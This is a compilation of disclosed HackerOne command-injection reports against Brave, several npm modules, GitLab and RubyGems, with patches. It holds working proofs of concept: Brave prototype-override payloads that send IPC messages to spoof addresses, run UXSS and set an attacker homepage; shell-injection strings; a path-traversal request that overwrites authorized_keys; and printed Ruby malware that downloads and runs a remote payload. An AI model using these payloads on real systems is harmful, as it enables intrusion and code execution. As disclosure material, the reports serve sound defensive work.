### [Sending arbitrary IPC messages via overriding Function.prototype.apply](https://hackerone.com/reports/188086)

- **Report ID:** `188086`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Brave Software
- **Reporter:** @masatokinugawa
- **Bounty:** 5300 usd
- **Disclosed:** 2018-09-18T18:15:50.065Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. This bug is similar to #187542.

## Tested on: 
Brave	0.12.11

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change2.html 
```
<script>
Function.prototype.apply=function(ipc){
    ipc.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
}
</script>
<div style="visibility:hidden">
<embed src=".swf"></embed>
</div>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `apply` in the `ipc_utils.js` is overwritten: 
```
  ipcRenderer.emit = function () {
    arguments[1].sender = ipcRenderer
    return EventEmitter.prototype.emit.apply(ipcRenderer, arguments)
  }
  atom.v8.setHiddenValue('ipc', ipcRenderer)
}
```
And the 1st arguments leaks IPC method.

Could you confirm this bug?
Thanks!

---

### [Sending arbitrary IPC messages via overriding Array.prototype.push](https://hackerone.com/reports/188561)

- **Report ID:** `188561`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Brave Software
- **Reporter:** @masatokinugawa
- **Bounty:** - usd
- **Disclosed:** 2018-09-18T18:15:36.258Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This bug is similar to #187542 and #188086.
I found that also `Array.prototype.push` is exploitable.

## Tested on: 
Brave	0.12.12

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html 
```
<script>
Array.prototype.push=function(e){
	this[0]=function(e,f){
		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
	}
}
</script>

<embed src=".swf"></embed>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `push` in the `event_emitter.js` is overwritten: 
```
EventEmitter2.prototype.on = function (event, fn) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
    .push(fn);
  return this;
};
```

Could you confirm this bug?
Thanks!

---

### [Brave Browser unexpectedly allows to send arbitrary IPC messages](https://hackerone.com/reports/187542)

- **Report ID:** `187542`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Brave Software
- **Reporter:** @masatokinugawa
- **Bounty:** 300 usd
- **Disclosed:** 2018-09-18T18:15:18.396Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I found that Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. 

## Steps to Reproduce:

1 .  An attacker overwrites `Function.prototype.call`, like this:

```
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="[ARBITRARY_IPC_MESSAGE_HERE]";
        e[1]="[ARBITRARY_IPC_MESSAGE_HERE]";
    }
    return this.apply(e);
}
```
2 .  An attacker calls `alert()`.

3 .  Brave's `alert()` function calls `Function.prototype.call` in the internal code. At this time, the overwritten `Function.prototype.call` is used in the `alert` internal code.

4 .  `Function.prototype.call` receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.

## PoC:

I'd like to show three PoCs:

###UXSS PoC

(If it goes well, you can see an alert dialog on google's domain.)
```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://www.google.com/ncr"},"openInForeground":true}'
    }
    return this.apply(e);
}
alert();

setTimeout(function(){
	for(var windowKey=0;windowKey<10000;windowKey++){
		Function.prototype.call=function(e){
			if(e && e[0] && e[0]=="window-alert"){
				e[0]="dispatch-action";
				e[1]=`{"actionType":"window-set-url","location":"javascript:alert('document.domain is: '+document.domain)","key":${windowKey}}`
			}
			return this.apply(e);
		}
		alert();
	}
},3000);
</script>
```


###Address Bar Spoofing PoC

(If it goes well, you can see https://www.google.com/ in address bar.)
```
<script>
Function.prototype.call=function(e){
	if(e && e[0] && e[0]=="window-alert"){
		e[0]="dispatch-action";
		e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/"}';
	}
	return this.apply(e);
}
alert();
</script>
```


###Change browser settings PoC

(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in `about:preferences`. )
```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}'
    }
    return this.apply(e);
}
alert();
</script>
```

FYI, Electron has similar issues. I reported it to Electron team and they are working on it.
Could you confirm this bug?
Thanks!

---

### [[ascii-art] Command injection](https://hackerone.com/reports/390631)

- **Report ID:** `390631`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @pontus_johnson
- **Bounty:** - usd
- **Disclosed:** 2018-09-08T08:36:27.752Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a command injection vulnerability in the **ascii-art npm** module.
It allows arbitrary shell command execution through a maliciously crafted command line argument.

# Module

**module name:** ascii-art
**version:** 1.4.3
**npm page:** `https://www.npmjs.com/package/ascii-art`

## Module Description

>Images, fonts, tables, ansi styles and compositing in Node.js & the browser. 100% JS.
>
>In the beginning there was colors.js but in the fine tradition of vendors calling out a problem they have the solution to, chalk was introduced. In that same vein, I offer ascii-art as an update, expansion and generalization of MooAsciiArt and at the same time it can replace your existing ansi colors library.
>
>It features support for Images, Styles, Tables and Figlet Fonts as well as handling multi-line joining automatically.

## Module Stats

56 downloads in the last day
217 downloads in the last week
1432 downloads in the last month

# Vulnerability

## Vulnerability Description

ascii-art does not sanitize the `target` command line argument, and subsequently passes it to `child_process.exec()`, thus allowing arbitrary shell command injection.

## Steps To Reproduce:

1. Install ascii-art: `sudo npm install -g ascii-art` (On a pristine Google Cloud instance, I also had to install pkg-config, libcairo2-dev, libjpeg-dev and libgif-dev, and then install ascii-art with unsafe-perm=true).
2. Run ascii-art with malicious argument: `ascii-art preview 'doom"; touch /tmp/malicious; echo "'`
3. Check that the injected command was executed: `ls /tmp/`

## Patch

Command execution happens [here](https://github.com/khrome/ascii-art/blob/9059daa5fcbf2c6a8813bbf072a1477d91e7b61d/bin/ascii-art#L210):

`exec('open "http://www.figlet.org/fontdb_example.cgi?font='+target.toLowerCase()+'.flf"')`

`exec` could be replaced by `execFile`, which would force developers to separate the command and its arguments.

## Supporting Material/References:

- Operating system: Debian GNU/Linux 9.5 (stretch)
- Node.js v8.11.3
- npm v5.6.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Arbitrary shell command execution.

**Summary (team):**

vulnerable versions: < 1.4.4
patched versions: >= 1.4.4

---

### [[samsung-remote] Command injection](https://hackerone.com/reports/394294)

- **Report ID:** `394294`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @pontus_johnson
- **Bounty:** - usd
- **Disclosed:** 2018-09-02T15:41:04.574Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a command injection vulnerability in the **samsung-remote** npm module.
It allows arbitrary shell command execution through a maliciously crafted argument.

# Module

**module name:** samsung-remote
**version:** 1.2.5
**npm page:** `https://www.npmjs.com/package/samsung-remote`

## Module Description

>Module for integration of Samsung SmartTV with your NodeJS application. Tested with Samsung D6000 TV.
>Inspired by this topic http://forum.samygo.tv/viewtopic.php?f=12&t=1792

## Module Stats

24 downloads in the last day
217 downloads in the last week
1024 downloads in the last month

# Vulnerability

## Vulnerability Description

samsung-remote does not sanitize the IP address argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection. It is not unlikely that some systems using this package will pass a user-controlled IP address to the function, thus inadvertently allowing arbitrary code execution by the user.

## Steps To Reproduce:

1. Install samsung-remote: `npm install samsung-remote --save`.
2. Create the following `index.js`file:

```
var remote = new SamsungRemote({
    ip: '127.0.0.1; touch /tmp/malicious;' 
});

remote.isAlive(function(err) {});
```
3. Execute `node index.js`
4. Check that the injected command was executed: `ls /tmp/`

## Patch

Command execution happens [here](https://github.com/natalan/samsung-remote/blob/bf7e68d78dddfb534d7ef6c501d0af5e4d32e788/lib/samsung-remote.js#L103):

`return exec("ping -c 1 " + config.ip, function (error, stdout, stderr) {`

`exec` could be replaced by `execFile`, which would force developers to separate the command and its arguments.

## Supporting Material/References:

- Operating system: Debian GNU/Linux 9.5 (stretch)
- Node.js v8.11.3
- npm v5.6.0

# Wrap up


- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Arbitrary shell command execution.

**Summary (team):**

vulnerable_version: <1.3.5
patched_version: >=1.3.5

---

### [Vulnerability in project import leads to arbitrary command execution](https://hackerone.com/reports/378148)

- **Report ID:** `378148`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @saltyyolk
- **Bounty:** - usd
- **Disclosed:** 2018-08-22T09:56:02.386Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
A filename regular expression could be bypassed and enable the attacker to create a symbolic link in Gitlab upload directory by importing a specially crafted Gitlab export. Further more, Gitlab is designed to not delete project upload directory currently. So, the attacker could delete the imported project and then upload another specially crafted Gitlab export to a project with the same name, which leads to path traversal/arbitrary file upload and finally enables the attacker to be able to get a shell with the permission of the system gitlab user.

**Description:**
1. how to create a symbolic link in the upload directory
code in `file_importer.rb` uses `%r{.*/\.{1,2}$}` to except `.` and `..` in the extracted project import directory tree, and check everything else that does not match this regex and delete all symlinks. However, we can easily construct a symlink with the name `.\nevil` in the tarball that matches this regex perfectly. Therefore, it will not be removed by function `remove_symlinks!` in the same file, and finally uploaded to `/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\nevil -> /var/opt/gitlab` (assume we import the project to `nyangawa/myrepo` and the symlink points to `/var/opt/gitlab`)

2. how to use the uploaded symbolic link to get shell access
First delete the `nyangawa/myrepo` project we just created. For some reasons the upload directory of this project does not get purged. Then we import another tarball which has, for example, `uploads/.\neviil/.ssh/authorized_keys` in it. And the content of this file is my ssh public key. Then import this tarball to create project `nyangawa/myrepo` again.

3. after all
the uploaded `authorized_keys` is copied to `/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\nevil/.ssh/authorized_keys` of the victim's filesystem but unfortunately, this path redirects to `/var/opt/gitlab/.ssh/authorized_keys`. Then I can login to the victim server by ssh with Gitlab's system username.


For step 2 and 3, there're some other approaches to get command executed since we can already upload any file to the victim's file system controlled by Gitlab.


## Steps To Reproduce:

As I stated in description. I can upload the 2 PoC tarballs if you ask.

## Impact

1. An attacker can upload arbitrary file to the victim's file system
1. Data of other users could be override
1. An attacker can get a system shell by overwrite specific files.

---

### [[egg-scripts] Command injection](https://hackerone.com/reports/388936)

- **Report ID:** `388936`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @pontus_johnson
- **Bounty:** - usd
- **Disclosed:** 2018-08-19T07:27:08.095Z
- **CVE(s):** CVE-2018-3786

**Vulnerability Information:**

I would like to report a command injection vulnerability in egg-scripts.
It allows arbitrary shell command execution through a maliciously crafted command line argument.

# Module

**module name:** [egg-scripts]
**version:** [2.6.0]
**npm page:** `https://www.npmjs.com/package/egg-scripts`

## Module Description

"deploy tool for egg project."

## Module Stats

Replace stats below with numbers from npm’s module page:

209 downloads in the last day
1,958 downloads in the last week
8,333 downloads in the last month

# Vulnerability

## Vulnerability Description

egg-script does not sanitize the --stderr command line argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection.

## Steps To Reproduce:

1. Install egg: `npm i egg --save`
2. Install egg-scripts: `sudo npm i egg-scripts -g --save`
3. Run eggctl with malicious argument: `eggctl start --daemon --stderr=/tmp/eggctl_stderr.log; touch /tmp/malicious`
4. Check that the injected command was executed: `ls /tmp/`
5. Stop eggctl: `eggctl stop`

## Patch

Command execution happens [here](https://github.com/eggjs/egg-scripts/blob/22faa4cfbb84cc5bc819d981dce962d8f95f8357/lib/cmd/start.js#L214):
```
const [ stdout ] = yield exec('tail -n 100 ' + stderr);
```
`exec` could be replaced by `execFile`, which would force developers to separate the command and its arguments.

## Supporting Material/References:
- Operating system: Debian GNU/Linux 9.5 (stretch)
- Node.js v8.11.3
- npm v5.6.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Arbitrary shell command execution.

---

### [Command Injection Vulnerability in win-fork/win-spawn Packages](https://hackerone.com/reports/390871)

- **Report ID:** `390871`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @cris_semmle
- **Bounty:** - usd
- **Disclosed:** 2018-08-10T13:08:53.777Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a command injection vulnerability in  win-fork and win-spawn packages.
It allows an attacker to inject multiple commands in exec-like manner.

# Module

**module name:** win-spawn
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/win-spawn`
**npm page:** `https://www.npmjs.com/package/win-fork`

## Module Description

Spawn for node.js but in a way that works regardless of which OS you're using. Use this if you want to use spawn with a JavaScript file. It works by explicitly invoking node on windows. It also shims support for environment variable setting by attempting to parse the command with a regex. Since all modification is wrapped in if (os === 'Windows_NT') it can be safely used on non-windows systems and will not break anything.

## Module Stats


21,929+36,468 downloads in the last week

# Vulnerability

## Vulnerability Description

Even though this module is advertised to work like spawn, on windows, it works like exec.

## Steps To Reproduce:

To check the params passed to cmd.exe:
```js
var os = require('os').type = function() {return "Windows_NT"};
require("child_process").spawn = function(a, b) { console.log(a); console.log(b)};
var spawn = require("win-fork");
spawn('dir C:// && date /T', [], {stdio: 'inherit'});
```
It effectively runs "cmd /c 'dir C:// && date /T'" which allow the attacker to run both the commands. Moreover, I believe parameters to win-spawn/win-fork may also be used for injection, but I did not investigate this further.

## Patch

N/A at a minimum, document this behaviour in the package's documentation.

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

This issue is more a documentation/API issue. The package should state clearly what it does and alert its dependents that on windows, the parameters should be treated as parameters to exec.

---

### [Malware in `active-support` gem](https://hackerone.com/reports/392311)

- **Report ID:** `392311`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** RubyGems
- **Reporter:** @reed
- **Bounty:** - usd
- **Disclosed:** 2018-08-09T18:14:31.969Z
- **CVE(s):** CVE-2018-3779

**Vulnerability Information:**

This was sent to RubySec:

The gem duplicates official `activesupport` (no hyphen) code, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (`29faea63.planfhntage.de`), downloads a payload, and executes.

active-support-5.2.0.gem/data/ext/trellislike/unflaming/waffling/extconf.rb

```
require 'net/http'
require 'uri'
require 'base64'
require 'resolv'

class Smectis
  def self.install_explot(weighership)
    if !weighership.nil? and weighership != '0.0.0.0'
      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))
      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|
        uterometer.binmode
        uterometer.write(educable.body)
        uterometer.chmod(0777)
        uterometer.close
      end
      system('/tmp/autosymbiontic')
    end
  end

  def self.run()
    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='
    jaunting = nil
    begin
      jaunting = Resolv.getaddress(Base64.decode64(milligram))
    rescue
    end
    self.install_exploit(jaunting)
  end
end

Smectis.run()
```

## Impact

Run arbitrary code on a victim's machine.

---

### [[entitlements] Command injection on the 'path' parameter](https://hackerone.com/reports/341869)

- **Report ID:** `341869`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @caioluders
- **Bounty:** - usd
- **Disclosed:** 2018-07-18T09:18:12.595Z
- **CVE(s):** -

**Vulnerability Information:**

Hello again, another command injection, this time on the `entitlements` module.

# Module

**module name:** entitlements
**version:** 1.2.0
**npm page:** https://www.npmjs.com/package/entitlements

## Module Description

> check the entitlements of a .app bundle

## Module Stats

26 downloads in the last day
328 downloads in the last week
896 downloads in the last month
14783 downloads in the last year

# Vulnerability

## Vulnerability Description

The module appends the `path` parameter to a command on the line [7](https://github.com/matiassingers/entitlements/blob/master/index.js#L7) without escaping it, leading to a command injection.

## Steps To Reproduce:

* Install the module

```
$ npm install entitlements
```

* Example code with the malicious payload ";touch a" on line 3.

```javascript
var entitlements = require('entitlements');

entitlements(';touch a', function(error, data){
  console.log(data);
});
```

* Run it.

```
$ node index.js
```

* Check the newly create file a

```
$ ls
a       index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `codesign` command.

## Supporting Material/References:

*  macOS Sierra 10.12.16
* NODEJS v8.4.0
*  NPM 5.3.0

# Wrap up

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker that controls the `path` parameter can inject commands on the victim's machine.

---

### [Code Execution in restricted CLI of EdgeSwitch](https://hackerone.com/reports/313245)

- **Report ID:** `313245`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @maxpl0it
- **Bounty:** - usd
- **Disclosed:** 2018-06-19T12:18:15.534Z
- **CVE(s):** -

**Summary (team):**

In EdgeSwitch 1.7.3 and prior, an user with admin credentials can make use of specially crafted commands to execute arbitrary shell instructions, bypassing the SSH/TELNET CLI interface.

**Summary (researcher):**

A command injection vulnerability existed in the restricted CLI of the EdgeSwitch.

Exploiting this vulnerability allows an attacker to break out of the restricted CLI and **elevate their privileges greater than the administrator themselves are able to**, taking full control of the Switch without the administrator ever knowing.

---

### [Triggering RCE using XSS to bypass CSRF in PowerBeam M5 300](https://hackerone.com/reports/289264)

- **Report ID:** `289264`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @maxpl0it
- **Bounty:** - usd
- **Disclosed:** 2018-06-19T12:17:04.753Z
- **CVE(s):** -

**Summary (team):**

In AirOS 6.1.5 and prior, due to lack of validation is possible to bypass the CSRF in certain web pages. If an authenticated user access an attacker controlled web page, it could trigger the CSRF and the resulting request could modify the device configuration and creating stored-XSS, with the XSS content is possible to bypass the CSRF completely and finally trigger the RCE.

**Summary (researcher):**

By chaining 4 bugs together, it is possible to cause command injection on a PowerBeam M5 300 using XSS to bypass the implemented form CSRF tokens.

---

### [Remote Command Execution vulnerability in pullit](https://hackerone.com/reports/315773)

- **Report ID:** `315773`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @lirantal
- **Bounty:** - usd
- **Disclosed:** 2018-06-14T19:51:02.368Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Remote Command Execution vulnerability in pullit
It allows remote command execution such as reading or writing to the file system, and executing other programs under the current user running the pullit node executable.

## Module

pullit

https://www.npmjs.com/package/pullit

version: 1.3.0

### Description

Display and pull branches from GitHub pull requests

### Module Stats

Stats
1 downloads in the last day
26 downloads in the last week
64 downloads in the last month

~768 estimated downloads per year

## Description

The pullit npm package makes insecure use of shell execution API (i.e: `exec()` or `execSync()`) which is vulnerable to a malicious user input based on a remote branch name on the GitHub platform, that can be set by a 3rd party, hence luring an innocent user to use the pullit module on the target branch and result in remote command execution exploit.

## Steps To Reproduce:

The pullit project has a set of exec() calls to git commands which may end up in originating from user input in terms of a carefully created remote branch name on GitHub, which pullit pulls branch names from.

Re-construct of a flow that results in a remote command execution on the user running pullit: 
1. Create a branch that could potentially terminate an exec() command and concatenate to it a new command:
    1. `git checkout -b ";{echo,hello,world}>/tmp/c”`
2. Push it to GitHub and create a pull request with this branch name
3. Run pullit from command line, select the relevant pull request to checkout locally
4. Read the contents of `/tmp/c`

## Patch

See below for patch to fix the problem:

pullit-security-rce.patch:

```
diff --git a/src/index.js b/src/index.js
index 3a34831..9bffd0d 100644
--- a/src/index.js
+++ b/src/index.js
@@ -1,7 +1,7 @@
 const GitHubApi = require('github');
 const Menu = require('terminal-menu');
 const {
-  execSync
+  execFileSync
 } = require('child_process');
 const parse = require('parse-github-repo-url');
 
@@ -12,7 +12,7 @@ class Pullit {
   }
 
   init() {
-    const url = execSync(`git config --get remote.origin.url`, {
+    const url = execFileSync('git', ['config', '--get', 'remote.origin.url'], {
       encoding: 'utf8'
     }).trim();
 
@@ -34,8 +34,11 @@ class Pullit {
       })
       .then(res => {
         const branch = res.data.head.ref;
-        execSync(
-          `git fetch origin pull/${id}/head:${branch} && git checkout ${branch}`
+        execFileSync(
+          'git', ['fetch', 'origin', `pull/${id}/head:${branch}`]
+        );
+        execFileSync(
+          'git', ['checkout', branch]
         );
       })
       .catch(err => {
```

## Supporting Material/References:

- MacOS Sierra 10.12.6 
- Node.js 8.9.4
- npm 5.6.0

## Wrap up

> Select Y or N for the following statements:

- [Y] I contacted the maintainer to let him know
- [N] I opened an issue in the related repository

## Impact

-

---

### [`macaddress` concatenates unsanitized input into exec() command](https://hackerone.com/reports/319467)

- **Report ID:** `319467`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-05-11T20:14:35.387Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report code injection in `macaddress`
It allows to inject arbitrary shell commands if the user input can influence the `iface` argument.

# Module

**module name:** macaddress
**version:** 0.2.8
**npm page:** `https://www.npmjs.com/package/macaddress`

## Module Description

> Retrieve MAC addresses in Linux, OS X, and Windows.

## Module Stats

81 238 downloads in the last day
1 632 083 downloads in the last week
7 031 342 downloads in the last month

~84376104 estimated downloads per year [JUST FOR REFERENCE,  ~DOWNLOADS PER MONTH*12]

# Vulnerability

## Vulnerability Description

`(async)  .one(iface, callback) → string` API does not escape or sanitize `iface` argument, and concatenates it to a shell command, passing it to `exec`.

Exact lines:
```
lib/linux.js:4:    exec("cat /sys/class/net/" + iface + "/address", function (err, out) {
lib/macosx.js:4:    exec("networksetup -getmacaddress " + iface, function (err, out) {
lib/unix.js:4:    exec("ifconfig " + iface, function (err, out) {
```

## Steps To Reproduce:

For Linux, use the following example:
```js
let iface = '../../../etc/passwd; touch /tmp/poof; echo ';
require('macaddress').one(iface, function (err, mac) {
  console.log("Mac address for this host: %s", mac);  
});
```

Observe `/etc/passwd` printed into the console, `/tmp/poof` file created.

For other OS, the testcase is similar.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Execute arbitrary shell commands if that parameter is user-controlled.

---

### [`command-exists` concatenates unsanitized input into exec()/execSync() commands](https://hackerone.com/reports/324453)

- **Report ID:** `324453`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-05-11T20:06:37.907Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report command injection in `command-exists`.
It allows to inject and execute arbitrary shell commands while trying to determine if a crafted command exists.

# Module

**module name:** `command-exists`
**version:** 1.2.2
**npm page:** `https://www.npmjs.com/package/command-exists`

## Module Description

> node module to check if a command-line command exists

## Module Stats

5 480 downloads in the last day
74 405 downloads in the last week
294 869 downloads in the last month

# Vulnerability

## Vulnerability Description

`commandName` argument is not properly escaped before being concatenated into the command that is passed to `exec()`/`execSync()`.

See https://github.com/mathisonian/command-exists/blob/v1.2.2/lib/command-exists.js#L49-L94

## Steps To Reproduce:

```js
const commandExists = require('command-exists');
commandExists.sync('ls; touch /tmp/foo0');
commandExists('ls; touch /tmp/foo1');
```

Observe `/tmp/foo0` and `/tmp/foo1` being created.

## Supporting Material/References:

- Arch Linux current
- Node.js 9.7.1
- npm 5.7.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

For setups where unsanitized user input could end up in `command-exists` argument, users would be able to execute arbitrary shell commands.

---

### [`fs-path` concatenates unsanitized input into exec()/execSync() commands](https://hackerone.com/reports/324491)

- **Report ID:** `324491`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-05-11T15:19:57.573Z
- **CVE(s):** CVE-2020-8298

**Vulnerability Information:**

I would like to report command injection in `fs-path`.
It allows to inject and execute arbitrary shell commands while performing various operations from `fs-path` API like copying files.

# Module

**module name:** `fs-path`
**version:** 0.0.24
**npm page:** `https://www.npmjs.com/package/fs-path`

## Module Description

> Useful file utitiles.

## Module Stats

108 downloads in the last day
2 916 downloads in the last week
13 186 downloads in the last month

# Vulnerability

## Vulnerability Description

Arguments are not properly escaped before being concatenated into the command that is passed to `exec()`/`execSync()`.

 See https://github.com/pillys/fs-path/blob/master/lib/index.js

## Steps To Reproduce:

```js
const fsPath = require('fs-path');
const source = '/bin/ls';
const target =  '/tmp/foo;rm\t/tmp/foo;whoami>\t/tmp/bar';
fsPath.copySync(source, target);
```

Observe `/tmp/bar` being created with `whoami` output.

The same issue affects other methods in `fs-path` API, not just `copySync`.

## Patch

The suggested fix is to avoid using `exec`/`execSync` and instead pass parameters as an array of arguments to corresponding `child_process` methods.

## Supporting Material/References:

* Arch Linux current
* Node.js 9.7.1
* npm 5.7.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

For setups where user input could end up in arguments of calls to `fs-wrap` API (like filename etc), users would be able to execute arbitrary shell commands.

Note that sanitization of user input on the application side might not prevent this issue, as simple path sanitization that removes stuff `/` and `..` is not enough — commands like `curl example.org | sh` might pass through sanitization of user input (like filenames etc.) on the application side.

---

### [XXE at Informatica sub-domain](https://hackerone.com/reports/150520)

- **Report ID:** `150520`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Informatica
- **Reporter:** @strukt
- **Bounty:** - usd
- **Disclosed:** 2018-04-30T06:17:40.780Z
- **CVE(s):** -

**Summary (team):**

Researcher has identified and reported an XXE in one of our domain and helped us in resolving the issue.

---

### [Command injection by overwriting authorized_keys file through GitLab import](https://hackerone.com/reports/298873)

- **Report ID:** `298873`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 2000 usd
- **Disclosed:** 2018-04-27T02:20:49.927Z
- **CVE(s):** CVE-2017-0915

**Vulnerability Information:**

The `Projects::GitlabProjectsImportService` contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary command execution vulnerability by overwriting the `authorized_keys` file. To reproduce, sign in to a GitLab instance that has GitLab import enabled. This is enabled by default, so I'd assume that this vulnerability applies to most GitLab instances. I've installed my GitLab instance through Omnibus.

Next up, intercept your network traffic and upload a GitLab import file. Observe the following request being made to the server:

**Request**
```
POST /import/gitlab_project HTTP/1.1
Host: gitlab-instance
...

------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="path"
test
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="namespace_id"

1
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="file"; filename="2017-12-17_02-20-093_root_test_export.tar.gz"
Content-Type: application/x-gzip

<file data>
```

Now take a closer look at the code that is being executed when this endpoint is hit:

**app/services/projects/gitlab_project_import_service.rb**
```ruby
# This service is an adapter used to for the GitLab Import feature, and
# creating a project from a template.
# The latter will under the hood just import an archive supplied by GitLab.
module Projects
  class GitlabProjectsImportService
    # ...

    def execute
      FileUtils.mkdir_p(File.dirname(import_upload_path))
      FileUtils.copy_entry(file.path, import_upload_path)

      Gitlab::ImportExport::ProjectCreator.new(params[:namespace_id],
                                               current_user,
                                               import_upload_path,
                                               params[:path]).execute
    end

    # ...

    def tmp_filename
      "#{SecureRandom.hex}_#{params[:path]}"
    end
  end
end
```

The `import_upload_path` will take the unsanitized `params[:path]` and append it to the GitLab uploads directory. This means that directories can be traversed in the `path` parameter. Another observation is that the file contents of the `file` aren't verified. This means that it may contain any data at that point.

My first though was to abuse this vulnerability to exploit a second-order remote code execution by writing an ERB template to the Rails views directory. However, that didn't work because of the file permissions of the GitLab Rails directory. I started looking for other files. I noticed that the uploads directory was writable for the `git` user. I took a closer look at the `/var/opt/gitlab/` directory and noticed the `.ssh/authorized_keys` directory. This file was writable for the `git` user, and thus, could be overwritten. This file can specify a command when an SSH connection is made. Now, going back to the original HTTP request, here's the updated request to overwrite the file:

```
POST /import/gitlab_project HTTP/1.1
Host: gitlab-instance
...

------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="path"

new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="namespace_id"

1
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="file"; filename="2017-12-17_02-20-093_root_test_export.tar.gz"
Content-Type: application/x-gzip

